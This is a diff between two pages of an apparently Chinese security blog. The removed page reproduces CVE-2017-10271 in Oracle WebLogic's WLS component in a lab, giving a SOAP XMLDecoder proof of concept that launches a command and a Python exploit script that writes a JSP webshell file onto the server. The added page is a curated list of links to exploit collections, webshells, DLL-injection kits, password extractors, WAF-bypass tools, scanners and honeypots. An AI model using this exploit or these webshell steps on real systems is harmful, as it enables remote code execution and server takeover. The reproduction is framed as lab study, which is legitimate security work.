@@ -4,9 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="WebLogic WLS组件漏洞复现, dylan&#39;s blog">
-    <meta name="description" content="0x01 漏洞概述漏洞编号：CVE-2017-10271
-漏洞描述：Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导">
+    <meta name="keywords" content="资源工具, dylan&#39;s blog">
+    <meta name="description" content="资源工具自用收集
+0x01 资源整理
+ATT&amp;amp;CKATT&amp;amp;CK之后门持久化
+内网渗透
+Intranet_Penetration_Tips备用:Intranet_Penetration_Tips2018年初整理的一些内网渗透T">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>WebLogic WLS组件漏洞复现 | dylan&#39;s blog</title>
+    <title>资源工具 | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -261,7 +264,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '9f77c4517ffa5375fb7f06c0209facae53fd5e4b7b88986eb0c11591810b2dbe';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('Being their worst nightmare！')).toString(CryptoJS.enc.Hex)) {
                 alert('Error！');
@@ -274,13 +277,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        WebLogic WLS组件漏洞复现
+                        资源工具
                     </div>
                 </div>
             </div>
@@ -391,20 +394,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞/" target="_blank">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/Information-Security/" target="_blank">
+                                <span class="chip bg-color">Information Security</span>
                             </a>
                         
-                            <a href="/tags/复现/" target="_blank">
-                                <span class="chip bg-color">复现</span>
+                            <a href="/tags/tools/" target="_blank">
+                                <span class="chip bg-color">tools</span>
                             </a>
                         
-                            <a href="/tags/WebLogic-WLS/" target="_blank">
-                                <span class="chip bg-color">WebLogic WLS</span>
-                            </a>
-                        
-                            <a href="/tags/中间件/" target="_blank">
-                                <span class="chip bg-color">中间件</span>
+                            <a href="/tags/sources/" target="_blank">
+                                <span class="chip bg-color">sources</span>
                             </a>
                         
                     </div>
@@ -415,8 +414,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Information-Security/" class="post-category" target="_blank">
-                                Information Security
+                            <a href="/categories/tools/" class="post-category" target="_blank">
+                                tools
                             </a>
                         
                     </div>
@@ -427,21 +426,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-08-06
+                    2019-08-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        701
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        5 分
                     </div>
                     
                 
@@ -457,76 +456,172 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>漏洞编号：CVE-2017-10271</p>
-<p>漏洞描述：<br>Weblogic的WLS Security组件对外提供webservice服务，<br>其中使用了XMLDecoder来解析用户传入的XML数据，<br>在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
-<p>受影响WebLogic版本：</p>
+                <p>资源工具自用收集</p>
+<h1 id="0x01-资源整理"><a href="#0x01-资源整理" class="headerlink" title="0x01 资源整理"></a>0x01 资源整理</h1><hr>
+<h2 id="ATT-amp-CK"><a href="#ATT-amp-CK" class="headerlink" title="ATT&amp;CK"></a><a href="https://attack.mitre.org/" target="_blank" rel="noopener">ATT&amp;CK</a></h2><p><a href="https://www.freebuf.com/articles/system/210910.html" target="_blank" rel="noopener">ATT&amp;CK之后门持久化</a></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><hr>
+<h3 id="Intranet-Penetration-Tips"><a href="#Intranet-Penetration-Tips" class="headerlink" title="Intranet_Penetration_Tips"></a><a href="https://github.com/Ridter/Intranet_Penetration_Tips" target="_blank" rel="noopener">Intranet_Penetration_Tips</a></h3><p>备用:<a href="https://github.com/dylan903/Intranet_Penetration_Tips" target="_blank" rel="noopener">Intranet_Penetration_Tips</a><br>2018年初整理的一些内网渗透TIPS</p>
+<h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><hr>
+<h3 id="injectAllTheThings"><a href="#injectAllTheThings" class="headerlink" title="[injectAllTheThings"></a>[injectAllTheThings</h3><p>](<a href="https://github.com/fdiskyou/injectAllTheThings" target="_blank" rel="noopener">https://github.com/fdiskyou/injectAllTheThings</a>)<br>备用：<a href="https://github.com/dylan903/injectAllTheThings" target="_blank" rel="noopener">injectAllTheThings</a><br>一个项目中有七种不同的DLL注入技术</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><hr>
+<h3 id="ThinkPHP-Vuln"><a href="#ThinkPHP-Vuln" class="headerlink" title="ThinkPHP-Vuln"></a><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a></h3><p>关于ThinkPHP框架的历史漏洞分析集合</p>
+<h3 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h3><hr>
+<p>ExploitDB官方git版本:</p>
+<p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p>
+<p>php漏洞代码分析：</p>
+<p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p>
+<p>CVE-2016-2107:</p>
+<p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p>
+<p>CVE-2015-7547 POC：</p>
+<p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p>
+<p>JAVA反序列化POC生成工具:</p>
+<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p>JAVA反序列化EXP:</p>
+<p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p>
+<p>Jenkins CommonCollections EXP:</p>
+<p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p>
+<p>CVE-2015-2426 EXP (windows内核提权):</p>
+<p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p>
+<p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</p>
+<p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p>
+<p>php7缓存覆写漏洞Demo及相关工具:</p>
+<p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p>
+<p>XcodeGhost木马样本:</p>
+<p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
+<h2 id="提权相关"><a href="#提权相关" class="headerlink" title="提权相关"></a>提权相关</h2><hr>
+<h3 id="windows配置错误导致权限提升"><a href="#windows配置错误导致权限提升" class="headerlink" title="windows配置错误导致权限提升"></a><a href="https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html" target="_blank" rel="noopener">windows配置错误导致权限提升</a></h3><p>Common Windows Misconfiguration: Services</p>
+<h1 id="0x02-工具整理"><a href="#0x02-工具整理" class="headerlink" title="0x02 工具整理"></a>0x02 工具整理</h1><h2 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h2><hr>
+<p><a href="http://tools.hexlt.org/whatcms" target="_blank" rel="noopener">CMS识别</a><br><a href="http://www.webscan.cc/" target="_blank" rel="noopener">C段查询</a><br><a href="https://www.shodan.io/" target="_blank" rel="noopener">撒旦</a><br><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a><br><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a><br><a href="https://www.somd5.com/" target="_blank" rel="noopener">MD5解密</a><br><a href="http://xssor.io/" target="_blank" rel="noopener">XSSOR</a><br><a href="https://regex101.com/" target="_blank" rel="noopener">正则分析</a></p>
+<h2 id="红队资源"><a href="#红队资源" class="headerlink" title="红队资源"></a>红队资源</h2><hr>
+<h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">nishang</a></h3><p>备用：<a href="https://github.com/dylan903/nishang" target="_blank" rel="noopener">Nishang - Offensive PowerShell for red team, penetration testing and offensive security.</a></p>
+<p>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.</p>
+<h2 id="webshell工具"><a href="#webshell工具" class="headerlink" title="webshell工具"></a>webshell工具</h2><hr>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell</a></h3><p>备用：<a href="https://github.com/dylan903/webshell" target="_blank" rel="noopener">webshell</a><br>This is a webshell open source project</p>
+<h3 id="AntSwordProject"><a href="#AntSwordProject" class="headerlink" title="AntSwordProject"></a><a href="https://github.com/AntSwordProject" target="_blank" rel="noopener">AntSwordProject</a></h3><p>AntSword is a cross-platform website management toolkit.</p>
+<h3 id="CknifeModifyVersion"><a href="#CknifeModifyVersion" class="headerlink" title="CknifeModifyVersion"></a><a href="https://github.com/dylan903/CknifeModifyVersion" target="_blank" rel="noopener">CknifeModifyVersion</a></h3><p>基于Cknife的基础进行小幅度修改</p>
 <ul>
-<li>10.3.6.0.0</li>
-<li>12.1.3.0.0</li>
-<li>12.2.1.1.0</li>
-<li>12.2.1.2.0</li>
+<li>增加PHP Cookie 一句话机制</li>
+<li>修复文件管理中的”修改文件时间”功能的</li>
+<li>增加 IP 归属功能</li>
 </ul>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><hr>
+<p>渗透以及web攻击脚本：</p>
+<p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p>
+<p>web渗透小工具大合集：</p>
+<p><a href="https://github.com/rootphantomer/hacktoolsfor_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hacktoolsfor_me</a></p>
+<p>XSS数据接收平台：</p>
+<p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<p>XSS与CSRF工具：</p>
+<p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p>
+<p>xss多功能扫描器：</p>
+<p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p>
+<p>web漏洞扫描器:</p>
+<p><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p>
+<p>WEB漏洞扫描器：</p>
+<p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p>
+<p>渗透常用小工具包：</p>
+<p><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p>
+<p>web目录扫描器:</p>
+<p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
+<p>web向命令注入检测工具：</p>
+<p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p>
+<p>自动化SQL注入检查工具：</p>
+<p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p>
+<p>SSL扫描器：</p>
+<p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p>
+<p>安全工具集合：</p>
+<p><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p>
+<p>apache日志分析器：</p>
+<p><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p>
+<p>php代码审计工具：</p>
+<p><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p>
+<p>web指纹识别扫描：</p>
+<p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p>
+<p>检查网站恶意攻击：</p>
+<p><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p>
+<p>wordprees漏洞扫描器：</p>
+<p><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p>
+<p>固件漏洞扫描器：</p>
+<p><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p>
+<p>数据库注入工具</p>
+<p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p>
+<p>Web代理：</p>
+<p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p>
+<p>新版中国菜刀：</p>
+<p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p>
+<p>git泄露利用EXP：</p>
+<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
+<p>浏览器攻击框架：</p>
+<p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p>
+<p>自动化绕过WAF脚本：</p>
+<p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p>
+<p><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p>
+<p>一款开源WAF：</p>
+<p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p>
+<p>http命令行客户端：</p>
+<p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p>
+<p>浏览器调试利器：</p>
+<p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p>
+<p>DISCUZ漏洞扫描器：</p>
+<p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></p>
+<p>自动化代码审计工具</p>
+<p><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p>
+<p>浏览器攻击框架：</p>
+<p><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p>
+<p>tomcat自动后门部署：</p>
+<p><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></p>
+<p>网络空间指纹扫描器：</p>
+<p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p>
+<p>burpsuit之J2EE扫描插件：</p>
+<p><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p>
+<h2 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h2><hr>
+<h3 id="YUJIANKEYGEN"><a href="#YUJIANKEYGEN" class="headerlink" title="YUJIANKEYGEN"></a><a href="https://github.com/dylan903/YUJIANKEYGEN" target="_blank" rel="noopener">YUJIANKEYGEN</a></h3><p>御剑WEB目录扫描优化版 KEYGEN</p>
+<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">wpscan</a></h3><p>备用：<a href="https://github.com/dylan903/wpscan" target="_blank" rel="noopener">wpscan</a><br>WPScan is a free, for non-commercial use, black box WordPress Vulnerability Scanner written for security professionals and blog maintainers to test the security of their WordPress websites. <a href="https://wpscan.org" target="_blank" rel="noopener">https://wpscan.org</a></p>
+<h3 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h3><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p>
+<p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p>
+<p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a></p>
+<p><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p>
+<h3 id="linux漏洞扫描："><a href="#linux漏洞扫描：" class="headerlink" title="linux漏洞扫描："></a>linux漏洞扫描：</h3><p><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p>
+<h2 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h2><hr>
+<p>社工收集器：</p>
+<p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p>
+<p>Github信息搜集：</p>
+<p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p>
+<p>github Repo信息搜集工具：</p>
+<p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p>
+<p>信息探测及扫描工具：</p>
+<p><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p>
+<p>内部网络信息扫描器：</p>
+<p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p>
+<p>远程桌面登录扫描器：</p>
+<p><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p>
+<p>网络基础设施渗透工具</p>
+<p><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p>
+<p>SNMAP密码破解:</p>
+<p><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p>
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><hr>
+<p>密码破解工具:</p>
+<p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p>
+<p>本地存储的各类密码提取利器:</p>
+<p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p>
+<h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><hr>
+<p>SSH蜜罐：</p>
+<p><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p>
+<p>蜜罐集合资源：</p>
+<p><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p>
+<p>kippo进阶版蜜罐：</p>
+<p><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p>
+<p>SMTP 蜜罐：</p>
+<p><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p>
+<p>web应用程序蜜罐：</p>
+<p><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p>
+<p>数据库蜜罐：</p>
+<p><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p>
+<p>web蜜罐：</p>
+<p><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p>
 <hr>
-<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Windows 10 1903 x64<br>靶   机：Windows server 2008 R2 x64</p>
-<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h3><p>安装<code>jdk1.8.0_191</code>（路径不要带有空格）,并配置环境变量<br>安装 <a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html" target="_blank" rel="noopener">WebLogic Server 10.3.6</a><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806171919.png" alt><br>详细安装过程参考：<a href="https://wenku.baidu.com/view/938a7a56f5335a8102d220d0.html" target="_blank" rel="noopener">webLogic10.3.6安装、配置图解</a></p>
-<p>输入配置管理员用户名和口令时设置的用户名和口令之后，<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172423.png" alt></p>
-<p>使用攻击机访问  <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>如出现如下界面，则搭建成功<br><strong>（注意：要把靶机上的防火墙关闭）</strong><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172734.png" alt></p>
-<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>&lt;soapenv:Envelope     xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
-    &lt;soapenv:Header&gt;
-       &lt;work:WorkContext    xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-           &lt;java      version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
-               &lt;void     class=&quot;java.lang.ProcessBuilder&quot;&gt;
-                    &lt;array    class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
-                        &lt;void     index=&quot;0&quot;&gt;
-                           &lt;string&gt;calc&lt;/string&gt;
-                        &lt;/void&gt;
-                        &lt;void     index=&quot;1&quot;&gt;
-                            &lt;string&gt;&lt;/string&gt;
-                        &lt;/void&gt;
-                        &lt;void     index=&quot;2&quot;&gt;
-                            &lt;string&gt; &lt;/string&gt;
-                        &lt;/void&gt;
-                    &lt;/array&gt;
-                &lt;void     method=&quot;start&quot;/&gt;&lt;/void&gt;
-           &lt;/java&gt;
-       &lt;/work:WorkContext&gt;
-   &lt;/soapenv:Header&gt;
-    &lt;soapenv:Body/&gt;
-    &lt;/soapenv:Envelope&gt;</code></pre><p>攻击机访问 <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>使用Burp Suite抓包，发送到Repeater<br>使用post方法发送下方POC，并添加Content-Type:text/xml，把Cache-Control修改为no-cache<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173735.png" alt></p>
-<p>返回状态码 500，进入靶机查看，弹出计算机，执行calc命令成功</p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173856.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806174012.png" alt></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#! -*- coding:utf-8 -*-
-import requests
-
-url = &quot;http://192.168.159.138:7001/wls-wsat/CoordinatorPortType&quot;
-xml = &#39;&#39;&#39;
-     &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
-     &lt;soapenv:Header&gt;
-     &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-     &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
-     &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
-     &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
-     &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
-     &lt;![CDATA[
- &lt;% out.print(&quot;test&quot;); %&gt;
-     ]]&gt;
-     &lt;/string&gt;
-     &lt;/void&gt;
-     &lt;void method=&quot;close&quot;/&gt;
-     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
-     &lt;/work:WorkContext&gt;
-     &lt;/soapenv:Header&gt;
-    &lt;soapenv:Body/&gt;
- &lt;/soapenv:Envelope&gt;
-&#39;&#39;&#39;
-r =requests.post(url,headers={&#39;Content-Type&#39;:&#39;text/xml&#39;,&#39;Cache-Control&#39;:&#39;no-cache&#39;},data=xml)
-print r.status_code
-
-print r.text</code></pre><p>(记得修改python文件里面的ip地址)<br>直接运行 <code>python2 CVE-2017-10271.py</code> 写入一句话</p>
-<p>访问shell<br><code>http://靶机ip:7001/bea_wls_internal/test.jsp</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806190652.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/vuls/158247.html" target="_blank" rel="noopener">WebLogic WLS组件漏洞复现</a><br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" target="_blank" rel="noopener">Weblogic(CVE-2017-10271)漏洞复现</a></p>
+<h1 id="0x03-靶场整理"><a href="#0x03-靶场整理" class="headerlink" title="0x03 靶场整理"></a>0x03 靶场整理</h1><hr>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege-Escalation"></a><a href="https://github.com/Ignitetechnologies/Privilege-Escalation" target="_blank" rel="noopener">Privilege-Escalation</a></h2><p>Linux提取靶场</p>
 
             </div>
             <hr/>
@@ -685,9 +780,9 @@ print r.text</code></pre><p>(记得修改python文件里面的ip地址)<br>直�
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《WebLogic WLS组件漏洞复现》
+                    《资源工具》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/23/zi-yuan-gong-ju/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -990,25 +1085,93 @@ print r.text</code></pre><p>(记得修改python文件里面的ip地址)<br>直�
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/">
+                <a href="/2019/08/31/sublime-text3-shi-yong-zhi-nan/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="永恒之蓝漏洞(ms17-010)复现">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Sublime Text3使用指南">
                         
-                        <span class="card-title">永恒之蓝漏洞(ms17-010)复现</span>
+                        <span class="card-title">Sublime Text3使用指南</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x01 漏洞概述永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT
+                            0x01 前言sublime是一款轻便、快捷的编辑器，好处多多，只不过配置起来麻烦了点，所有在此记录一下自用配置。（本文默认环境为window 10）
+
+0x02 下载官网直达,下载安装即可
+0x03 使用技巧启用VIM模式在Prefere
                         
                     </div>
                     <div class="publish-info">
